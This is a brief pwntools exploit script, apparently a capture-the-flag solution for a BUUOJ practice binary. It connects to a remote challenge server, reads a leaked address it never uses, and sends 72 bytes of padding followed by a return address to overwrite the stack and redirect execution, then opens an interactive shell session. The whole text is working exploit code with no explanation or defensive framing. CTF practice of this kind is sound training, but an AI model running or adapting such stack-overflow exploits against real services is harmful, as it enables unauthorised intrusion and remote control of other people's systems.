from pwn import *

context.binary = exe = ELF('./2', checksec=False)
p = remote('node4.buuoj.cn', 25276)

p.recvuntil(b'WOW:')
leak = int(p.recvline(), 16)

p.sendline(b'a' * 72 + p64(0x40060e))

p.interactive()
